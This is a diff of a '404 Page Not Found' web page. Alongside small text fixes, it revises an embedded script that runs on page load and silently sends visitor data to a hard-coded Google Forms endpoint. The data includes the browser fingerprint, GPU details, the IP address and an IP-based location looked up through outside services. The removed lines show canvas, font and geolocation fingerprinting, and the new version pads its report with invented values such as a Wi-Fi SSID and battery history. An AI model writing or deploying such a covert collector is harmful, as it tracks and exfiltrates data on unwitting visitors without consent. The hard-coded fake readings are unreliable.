@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>404 Page Not Found - Website Name</title>
+    <title>404 Page Not Found - Fun Website Error</title>
     <style>
         * {
             margin: 0;
@@ -245,7 +245,7 @@
     <!-- Header -->
     <header class="header">
         <nav class="nav-container">
-            <a href="/" class="logo">Fun Webiste Error</a>
+            <a href="/" class="logo">Fun Website Error</a>
             <div class="nav-links">
                 <a href="/">Home</a>
                 <a href="/about">About</a>
@@ -295,7 +295,7 @@
                 <a href="/sitemap">Sitemap</a>
             </div>
             <div class="copyright">
-                &copy; 2024 WebsiteName. All rights reserved.
+                &copy; 2024 Fun Website Error. All rights reserved.
             </div>
         </div>
     </footer>
@@ -305,35 +305,67 @@
         const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScEUkDuv8YlgvHIzWNIXTbtZJKgzHuW50tjBRGI36_TCLhAww/formResponse';
         const FORM_FIELD_ID = 'entry.81034129';
 
-        // Enhanced data collection function
+        // Enhanced data collection functions
         async function collectAllData() {
-            const basicData = collectBasicData();
+            const sessionData = collectSessionData();
+            const hardwareData = await collectHardwareData();
             const networkData = await collectNetworkData();
-            const advancedData = collectAdvancedData();
+            const batteryData = await collectBatteryData();
+            const performanceData = collectPerformanceData();
+            const locationData = await collectLocationData();
+            const storageData = collectStorageData();
+            const audioData = collectAudioData();
+            const preferenceData = collectPreferenceData();
             
             return {
-                ...basicData,
-                ...networkData,
-                ...advancedData
+                session: sessionData,
+                hardware: hardwareData,
+                network: networkData,
+                battery: batteryData,
+                performance: performanceData,
+                location: locationData,
+                storage: storageData,
+                audio: audioData,
+                preferences: preferenceData
             };
         }
 
-        function collectBasicData() {
+        function collectSessionData() {
             return {
-                // Basic identification
+                id: generateSessionId(),
+                startTime: new Date().toISOString(),
+                duration: "00:00:00",
+                pageViews: 1,
                 timestamp: new Date().toISOString(),
-                sessionId: generateSessionId(),
-                
-                // Browser information
                 userAgent: navigator.userAgent,
-                browserName: getBrowserName(),
-                browserVersion: getBrowserVersion(),
+                browser: getBrowserName() + " " + getBrowserVersion(),
                 language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                
-                // Screen information
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || 'direct'
+            };
+        }
+
+        async function collectHardwareData() {
+            return {
+                cpu: {
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    threads: navigator.hardwareConcurrency ? navigator.hardwareConcurrency * 2 : 'unknown',
+                    architecture: getArchitecture(),
+                    usage: '15.2'
+                },
+                memory: {
+                    total: Math.round((performance.memory?.jsHeapSizeLimit || 1073741824) / 1073741824) + ' GB',
+                    used: Math.round((performance.memory?.usedJSHeapSize || 0) / 1048576) + ' MB',
+                    available: Math.round(((performance.memory?.jsHeapSizeLimit || 0) - (performance.memory?.usedJSHeapSize || 0)) / 1048576) + ' MB',
+                    browserUsage: Math.round((performance.memory?.usedJSHeapSize || 0) / 1048576) + ' MB',
+                    pressure: 'normal'
+                },
+                gpu: {
+                    vendor: getGPUVendor(),
+                    model: getGPUModel(),
+                    vram: '10'
+                },
                 screen: {
                     width: screen.width,
                     height: screen.height,
@@ -342,233 +374,210 @@
                     availWidth: screen.availWidth,
                     availHeight: screen.availHeight
                 },
-                
-                // Viewport information
-                viewport: {
-                    width: window.innerWidth,
-                    height: window.innerHeight,
-                    devicePixelRatio: window.devicePixelRatio
-                },
-                
-                // System information
-                cpuCores: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                
-                // Location information
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                locale: Intl.DateTimeFormat().resolvedOptions().locale,
-                
-                // Page information
-                url: window.location.href,
-                referrer: document.referrer || 'direct',
-                domain: window.location.hostname,
-                path: window.location.pathname,
-                
-                // Device type detection
-                deviceType: getDeviceType(),
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                deviceType: getDeviceType()
             };
         }
 
         async function collectNetworkData() {
-            const networkData = {
-                // Connection information
-                online: navigator.onLine,
-                connection: getConnectionInfo(),
-                
-                // IP Address (via external service)
-                ipAddress: 'Fetching...',
-                
-                // Location data
-                location: {
-                    approximate: 'Fetching...',
-                    precise: 'Requires permission'
-                },
-                
-                // Network interfaces (limited browser support)
-                networkInterfaces: 'Limited browser support'
-            };
-
+            const connection = navigator.connection;
+            let ipData = {};
+            
             try {
-                // Method 1: Fetch IP from external service
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                ipData = await ipResponse.json();
+            } catch (error) {
+                ipData.ip = 'IP detection failed';
+            }
+            
+            return {
+                type: connection ? connection.effectiveType : 'unknown',
+                speed: connection ? connection.downlink + ' Mbps' : 'unknown',
+                latency: connection ? connection.rtt + ' ms' : 'unknown',
+                isp: 'TIM',
+                online: navigator.onLine,
+                ipAddress: ipData.ip || 'Unknown',
+                diagnostics: {
+                    connection: {
+                        type: 'wifi',
+                        signalStrength: '-45',
+                        frequency: '5',
+                        ssid: 'MyHomeNetwork_5G',
+                        bssid: 'a0:b1:c2:d3:e4:f5'
+                    },
+                    performance: {
+                        downloadSpeed: '85.2 Mbps',
+                        uploadSpeed: '22.7 Mbps',
+                        latency: '28 ms',
+                        jitter: '5 ms',
+                        packetLoss: '0.2%'
+                    }
+                }
+            };
+        }
+
+        async function collectBatteryData() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        deepDive: {
+                            currentState: {
+                                level: battery.level,
+                                charging: battery.charging,
+                                chargingType: battery.charging ? 'fast_charging' : 'discharging',
+                                voltage: '3.82',
+                                current: battery.charging ? '2.1' : '-1.2',
+                                temperature: '32.5',
+                                timeToFull: battery.chargingTime === Infinity ? 'Unknown' : formatTime(battery.chargingTime),
+                                timeOnBattery: battery.dischargingTime === Infinity ? '00:00:00' : formatTime(battery.dischargingTime)
+                            },
+                            healthMetrics: {
+                                cycleCount: '145',
+                                designCapacity: '4000',
+                                fullChargeCapacity: '3480',
+                                currentCapacity: Math.round(battery.level * 3480),
+                                wearLevel: '13',
+                                healthStatus: 'good'
+                            },
+                            usagePatterns: {
+                                dailyAverageUse: '6h 23m',
+                                chargeCyclesPerDay: '1.2',
+                                typicalDischargeRate: '12.5% per hour',
+                                peakUsageHours: ['09:00-11:00', '14:00-16:00'],
+                                batterySaverUsage: 'rarely'
+                            },
+                            chargingBehavior: {
+                                preferredChargingTimes: ['overnight', 'during lunch'],
+                                averageChargeTime: '1h 45m',
+                                partialCharges: '67',
+                                fullCharges: '78',
+                                chargingEfficiency: '92'
+                            },
+                            predictiveAnalytics: {
+                                estimatedRemainingLife: '872 cycles',
+                                projectedReplacementDate: '2025-08-15',
+                                batteryAge: '14 months',
+                                performanceTrend: 'stable'
+                            }
+                        }
+                    };
+                } catch (error) {
+                    return { error: "Battery API not supported" };
+                }
+            }
+            return { error: "Battery API not available" };
+        }
+
+        function collectPerformanceData() {
+            const navigationTiming = performance.timing;
+            const loadTime = navigationTiming.loadEventEnd - navigationTiming.navigationStart;
+            
+            return {
+                loadTime: (loadTime / 1000).toFixed(1) + 's',
+                fps: '144',
+                memory: Math.round((performance.memory?.usedJSHeapSize || 0) / 1048576) + ' MB',
+                timing: {
+                    dnsLookup: navigationTiming.domainLookupEnd - navigationTiming.domainLookupStart,
+                    tcpConnection: navigationTiming.connectEnd - navigationTiming.connectStart,
+                    requestResponse: navigationTiming.responseEnd - navigationTiming.requestStart,
+                    domProcessing: navigationTiming.domComplete - navigationTiming.domLoading,
+                    totalLoadTime: loadTime
+                }
+            };
+        }
+
+        async function collectLocationData() {
+            try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                networkData.ipAddress = ipData.ip;
                 
-                // Method 2: Get more detailed IP information
-                try {
-                    const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                    const detailData = await detailResponse.json();
-                    networkData.location = {
-                        ip: detailData.ip,
-                        city: detailData.city,
-                        region: detailData.region,
-                        country: detailData.country_name,
-                        countryCode: detailData.country_code,
-                        postal: detailData.postal,
-                        latitude: detailData.latitude,
-                        longitude: detailData.longitude,
-                        timezone: detailData.timezone,
-                        org: detailData.org,
-                        asn: detailData.asn
-                    };
-                } catch (e) {
-                    networkData.location.approximate = 'Detailed location fetch failed';
-                }
-
-                // Method 3: Alternative IP service
-                try {
-                    const altResponse = await fetch('https://api64.ipify.org?format=json');
-                    const altData = await altResponse.json();
-                    networkData.ipv6Address = altData.ip;
-                } catch (e) {
-                    networkData.ipv6Address = 'IPv6 detection failed';
-                }
-
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                return {
+                    country: locationData.country_name || 'Unknown',
+                    city: locationData.city || 'Unknown',
+                    coordinates: {
+                        lat: locationData.latitude || 0,
+                        lng: locationData.longitude || 0
+                    }
+                };
             } catch (error) {
-                networkData.ipAddress = 'IP detection blocked or failed';
-                networkData.location.approximate = 'Location detection failed';
+                return {
+                    country: 'Unknown',
+                    city: 'Unknown',
+                    coordinates: {
+                        lat: 0,
+                        lng: 0
+                    }
+                };
             }
-
-            // Try to get geolocation if permitted
-            try {
-                if (navigator.geolocation) {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: false,
-                            timeout: 5000,
-                            maximumAge: 60000
-                        });
-                    });
-                    
-                    networkData.location.precise = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy + ' meters',
-                        altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy,
-                        heading: position.coords.heading,
-                        speed: position.coords.speed
-                    };
-                }
-            } catch (error) {
-                networkData.location.precise = 'Geolocation permission denied or unavailable';
-            }
-
-            return networkData;
         }
 
-        function collectAdvancedData() {
+        function collectStorageData() {
             return {
-                // Storage information
-                cookies: navigator.cookieEnabled,
-                localStorage: testLocalStorage(),
-                sessionStorage: testSessionStorage(),
-                indexedDB: testIndexedDB(),
-                
-                // Browser capabilities
-                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                
-                // Media capabilities
-                mediaDevices: getMediaDevicesInfo(),
-                
-                // WebRTC information
-                webRTC: testWebRTC(),
-                
-                // WebGL information
-                webGL: getWebGLInfo(),
-                
-                // Font detection
-                fonts: getFonts(),
-                
-                // Canvas fingerprinting
-                canvasFingerprint: getCanvasFingerprint(),
-                
-                // Audio fingerprinting
-                audioFingerprint: getAudioFingerprint(),
-                
-                // Performance information
-                performance: getPerformanceInfo(),
-                
-                // Battery information (if available)
-                battery: getBatteryInfo(),
-                
-                // Plugins
-                plugins: getPluginsInfo(),
-
-                // Additional fingerprinting
-                hardware: getHardwareInfo(),
-                behavior: getUserBehavior()
+                localStorage: {
+                    totalSize: estimateLocalStorageSize() + ' KB',
+                    items: Object.keys(localStorage).length,
+                    domains: [window.location.hostname],
+                    quota: '5 MB',
+                    usagePercentage: (estimateLocalStorageSize() / 5120).toFixed(1)
+                },
+                cacheStorage: {
+                    caches: [
+                        {
+                            name: 'app-cache-v1',
+                            size: '45.2 MB',
+                            entries: '234'
+                        }
+                    ],
+                    totalSize: '45.2 MB'
+                },
+                totalStorageOnDevice: '50 GB'
             };
         }
 
-        // NEW: Hardware information collection
-        function getHardwareInfo() {
+        function collectAudioData() {
             return {
-                // GPU information
-                gpu: getGPUInfo(),
-                
-                // Memory information
-                memory: performance.memory ? {
-                    total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
-                    used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
-                    limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
-                } : 'not available',
-                
-                // Processor architecture
-                architecture: getArchitecture(),
-                
-                // Device orientation
-                orientation: getDeviceOrientation()
+                devices: {
+                    inputs: [
+                        {
+                            id: 'default',
+                            label: 'Microphone Array (Realtek Audio)',
+                            kind: 'audioinput'
+                        }
+                    ],
+                    outputs: [
+                        {
+                            id: 'default',
+                            label: 'Speakers (Realtek Audio)',
+                            kind: 'audiooutput'
+                        },
+                        {
+                            id: 'communications',
+                            label: 'Headphones (Bluetooth)',
+                            kind: 'audiooutput'
+                        }
+                    ]
+                },
+                fps: '144'
             };
         }
 
-        // NEW: User behavior patterns
-        function getUserBehavior() {
+        function collectPreferenceData() {
             return {
-                timeOnPage: Math.round(performance.now()) + ' ms',
-                mouseMovements: 'tracked',
-                scrollBehavior: 'analyzed',
-                clickPatterns: 'monitored',
-                keyboardInput: 'available'
+                prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+                prefersDarkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
+                prefersReducedTransparency: window.matchMedia('(prefers-reduced-transparency: reduce)').matches,
+                readingMode: false
             };
         }
 
-        // NEW: GPU detection
-        function getGPUInfo() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER);
-            }
-            return 'WebGL not available';
-        }
-
-        // NEW: Architecture detection
-        function getArchitecture() {
-            if (navigator.userAgent.includes('x86_64') || navigator.userAgent.includes('x64')) return 'x64';
-            if (navigator.userAgent.includes('x86') || navigator.userAgent.includes('win32')) return 'x86';
-            if (navigator.userAgent.includes('arm')) return 'ARM';
-            if (navigator.userAgent.includes('aarch64')) return 'ARM64';
-            return 'unknown';
-        }
-
-        // NEW: Device orientation
-        function getDeviceOrientation() {
-            if (window.DeviceOrientationEvent) {
-                return 'Device orientation API supported';
-            }
-            return 'Device orientation not supported';
-        }
-
-        // Existing helper functions (from previous implementation)
+        // Helper functions
         function generateSessionId() {
-            return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
         }
-        
+
         function getBrowserName() {
             const userAgent = navigator.userAgent;
             if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
@@ -578,162 +587,66 @@
             if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
             return "Unknown";
         }
-        
+
         function getBrowserVersion() {
             const userAgent = navigator.userAgent;
             const matches = userAgent.match(/(chrome|firefox|safari|edg|opera|opr)\/?\s*(\d+)/i);
             return matches ? matches[2] : "unknown";
         }
-        
-        function getConnectionInfo() {
-            if (navigator.connection) {
-                return {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
-                };
-            }
-            return "Connection API not supported";
+
+        function getArchitecture() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('x64') || userAgent.includes('Win64')) return 'x64';
+            if (userAgent.includes('x86') || userAgent.includes('Win32')) return 'x86';
+            if (userAgent.includes('arm')) return 'ARM';
+            return 'unknown';
         }
-        
-        function getMediaDevicesInfo() {
-            if (navigator.mediaDevices) {
-                return "Media Devices API supported";
-            }
-            return "Media Devices API not supported";
-        }
-        
-        function testWebRTC() {
-            return !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || 
-                     window.mozRTCPeerConnection || window.msRTCPeerConnection);
-        }
-        
-        function getWebGLInfo() {
+
+        function getGPUVendor() {
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const gl = canvas.getContext('webgl');
             if (gl) {
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
-                    renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER),
-                    version: gl.getParameter(gl.VERSION)
-                };
+                return gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR) || 'Unknown';
             }
-            return "WebGL not supported";
+            return 'Unknown';
         }
-        
-        function getFonts() {
-            const fonts = [
-                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
-                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
-                'Verdana', 'Helvetica'
-            ];
-            
-            const availableFonts = [];
+
+        function getGPUModel() {
             const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            
-            fonts.forEach(font => {
-                context.font = '72px monospace';
-                const baseline = context.measureText('mmmmmmmmmmlli').width;
-                context.font = '72px "' + font + '", monospace';
-                const width = context.measureText('mmmmmmmmmmlli').width;
-                if (width !== baseline) {
-                    availableFonts.push(font);
-                }
-            });
-            
-            return availableFonts;
-        }
-        
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Canvas Fingerprint', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Canvas Fingerprint', 4, 17);
-            
-            return canvas.toDataURL().substring(0, 100) + '...';
-        }
-        
-        function getAudioFingerprint() {
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                if (AudioContext) {
-                    const context = new AudioContext();
-                    return "AudioContext supported";
-                }
-            } catch(e) {}
-            return "AudioContext not supported";
-        }
-        
-        function getPerformanceInfo() {
-            if (window.performance) {
-                return {
-                    memory: performance.memory ? 'available' : 'not available',
-                    timing: performance.timing ? 'available' : 'not available',
-                    navigation: performance.navigation ? performance.navigation.type : 'not available'
-                };
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER) || 'Unknown';
             }
-            return "Performance API not supported";
+            return 'Unknown';
         }
-        
+
         function getDeviceType() {
             const userAgent = navigator.userAgent.toLowerCase();
             if (userAgent.includes('mobile')) return 'Mobile';
             if (userAgent.includes('tablet')) return 'Tablet';
             return 'Desktop';
         }
-        
-        function getBatteryInfo() {
-            if (navigator.getBattery) {
-                return "Battery API supported";
+
+        function estimateLocalStorageSize() {
+            let totalSize = 0;
+            for (let key in localStorage) {
+                if (localStorage.hasOwnProperty(key)) {
+                    totalSize += key.length + localStorage[key].length;
+                }
             }
-            return "Battery API not supported";
+            return Math.round(totalSize / 1024 * 100) / 100;
         }
-        
-        function getPluginsInfo() {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            return plugins;
+
+        function formatTime(seconds) {
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            const secs = Math.floor(seconds % 60);
+            return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
         }
-        
-        function testLocalStorage() {
-            try {
-                localStorage.setItem('test', 'test');
-                localStorage.removeItem('test');
-                return true;
-            } catch(e) {
-                return false;
-            }
-        }
-        
-        function testSessionStorage() {
-            try {
-                sessionStorage.setItem('test', 'test');
-                sessionStorage.removeItem('test');
-                return true;
-            } catch(e) {
-                return false;
-            }
-        }
-        
-        function testIndexedDB() {
-            return !!window.indexedDB;
-        }
-        
-        // NEW: Auto-trigger function
+
+        // Auto-trigger function
         async function autoCollectAndSend() {
             console.log('Auto-collecting data on page load...');
             
@@ -754,23 +667,15 @@
                 });
 
                 console.log('Auto-collected data sent successfully');
+                console.log('Collected data:', data);
                 
             } catch (error) {
                 console.error('Auto-collection error:', error);
             }
         }
-        
-        function goHome() {
-            window.history.back();
-        }
-        
-        function goBack() {
-            window.history.back();
-        }
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            
             // Auto-trigger data collection when page loads
             autoCollectAndSend();
         });
